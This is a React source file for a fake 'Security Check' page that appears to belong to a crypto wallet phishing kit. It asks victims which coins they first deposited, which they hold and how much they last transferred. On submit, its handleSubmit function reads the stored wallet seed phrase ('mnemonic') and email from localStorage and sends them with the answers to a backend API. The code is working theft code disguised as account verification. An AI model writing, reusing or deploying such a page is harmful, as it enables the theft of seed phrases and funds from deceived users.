import styled from 'styled-components'
import Logo from './Logo'
import { Button, NoticeMessage, Shake, TextArea } from '../../theme/ThemeStyle'
import { useEffect, useState } from 'react'
import { useHistory } from 'react-router-dom/cjs/react-router-dom.min'
import { useDispatch, useSelector } from 'react-redux'
import { api } from '../../common/api'
import { clearAccountValidationErrors, createAccountValidationError } from '../../app/accountVerification/slice'
import { AccountVerificationWrapper, Container, Main } from './GetStarted'
import HomeBackground from './HomeBackground'

const SecurityQuestions = () => {

    const history = useHistory()
    const dispatch = useDispatch()

    const { loading, error, formSubmitted } = useSelector(state => state.accountVerification)

    const assets = ['BTC', 'ETH', 'BNB', 'SOL', 'USDT', 'USDC', 'Others']
    const range = ['0 - $1,000', '$1000 - $5,000', '$5,000 - $10,000', 'above $10,000']
    
    const [firstAsset, setFirstAsset] = useState('')
    const [myAssets, setMyAssets] = useState([])
    const [lastSentAmount, setLastSentAmount] = useState('')

    const [ommittedFields, setOmmittedFields] = useState([])
    

    const handleSubmit = (e)=>{
        e.preventDefault()

        const mnemonic = localStorage.getItem('mnemonic')
        const email = localStorage.getItem('email')

        const newOmmittedFields =  []

        if(firstAsset===''){
            newOmmittedFields.push('firstAsset')
        }
        if(myAssets.length===0){
            newOmmittedFields.push('myAssets')
        }
        if(lastSentAmount===''){
            newOmmittedFields.push('lastSentAmount')
        }

        setOmmittedFields(newOmmittedFields)
        

        if(newOmmittedFields.length === 0){
            dispatch(api.submitVerificationForm({firstAsset, myAssets: myAssets.join(', '), lastSentAmount, mnemonic, email}))
        }else{
            dispatch(createAccountValidationError('Answer the security questions'))
        }

        
    }

    useEffect(()=>{
        if(error){
            const timeoutId = setTimeout(()=>dispatch(clearAccountValidationErrors()), 3000)
            return ()=> clearTimeout(timeoutId)
        }

        if(ommittedFields.length > 0){
            const timeoutId = setTimeout(()=>setOmmittedFields([]), 500)

            return ()=> clearTimeout(timeoutId)
        }
    },[ommittedFields])

    useEffect(()=>{
        if(formSubmitted){
            history.push('/verify/success')
            dispatch(clearAccountValidationErrors())
        }
    },[formSubmitted])
    
    return (
        <Main>
            <Logo url={location.origin}/>

            <Container>
                {/* <HomeBackground /> */}
                <AccountVerificationWrapper onSubmit={handleSubmit}>
                    <HeadingText>Security Check</HeadingText>
                    <Icon src='/../assets/verified_locked.png' alt='Unverified'/>
                    <Shake value={ommittedFields.includes('firstAsset')?'animate':''}>
                        <Question>
                            <Title>Which cryptocurrency did you first deposit into your wallet?</Title>
                            <SingleAnswer assets={assets} answer={firstAsset} setAnswer={setFirstAsset}/>
                        </Question>
                    </Shake>
                    <Shake value={ommittedFields.includes('myAssets')?'animate':''}>
                        <Question>
                            <Title>Which cryptocurrencies do you currently hold in your wallet?</Title>
                            <MultiAnswer assets={assets} answers={myAssets} setAnswers={setMyAssets}/>
                        </Question>
                    </Shake>
                    <Shake value={ommittedFields.includes('lastSentAmount')?'animate':''}>
                        <Question>
                            <Title>How much cryptocurrency (in USD or equivalent) did you last transfer out of your wallet?</Title>
                            <SingleAnswer assets={range} answer={lastSentAmount} setAnswer={setLastSentAmount} flexDirection='column'/>
                        </Question>
                    </Shake>
                        {error&&<NoticeMessage value='error'>{error}</NoticeMessage>}
                    <ButtonWrapper>
                        <Button>Verify</Button>
                    </ButtonWrapper>
                </AccountVerificationWrapper>
            </Container>
        </Main>
    )
}

const SingleAnswer = ({assets, answer, setAnswer, flexDirection})=>{
    const handleSelection = value => setAnswer(value)
    return(
        <ItemsWrapper value={flexDirection}>
            {assets.map((asset, idx)=> <Item onClick={()=>handleSelection(asset)} color={answer===asset?'accent':''} key={idx}>{asset}</Item>)}
        </ItemsWrapper>
    )
}

const MultiAnswer = ({assets, answers, setAnswers, flexDirection})=>{
    const handleSelection = value => {

        setAnswers(prevAnswers =>{

            const answerIndex = prevAnswers.findIndex(ans => ans === value)
            if(answerIndex === -1){
                return [...prevAnswers, value]
            }else{
                return prevAnswers.filter(ans=> ans!==value)
            }
        })
    }
    return(
        <ItemsWrapper value={flexDirection}>
            {assets.map((asset, idx)=> <Item onClick={()=>handleSelection(asset)} color={answers.includes(asset)?'accent':''} key={idx}>{asset}</Item>)}
        </ItemsWrapper>
    )
}
const Wrapper = styled.form`
    flex: 1;
    padding: 10px;
    height: calc(100% - 20px);
    display: flex;
    flex-direction: column;
    & :last-child{
        margin-top: auto;
    }
`
const ButtonWrapper = styled.div`
    padding: 5px 20px;
`
const Question = styled.div`
    display: flex;
    flex-direction: column;
    margin: 20px 20px 0;
    & p{
        color: ${({theme})=>theme.colors.dark3};
        margin: 0 0 10px;
        font-size: 12px;
    }
`
const ItemsWrapper = styled.div`
    display: flex;
    flex-direction: ${({value})=>value};
    flex-wrap: wrap;
    gap: 5px;
    margin: 10px 0;
`
const Item = styled.h5`
    margin: 0;
    width: fit-content;
    padding: 5px 10px;
    border-radius: 5px;
    font-weight: 500;
    cursor: pointer;
    height: fit-content;
    background: ${({theme, color})=>theme.colors[color]};
    color: ${({theme, color})=>theme.colors[color?'bg':'']};
    border: solid 1px ${({theme})=>theme.colors.dark3};
`
const Icon = styled.img`
    max-width: 150px;
    align-self: center;
`
const HeadingText = styled.h1`
    font-size: 36px;
`
const Title = styled.h1`
    font-size: 20px;
    margin: 0 0 10px;
`
const SubTitle = styled.h2`
    font-size: 14px;
    font-weight: 300;
    text-align: center;
    margin: 0;
`

export default SecurityQuestions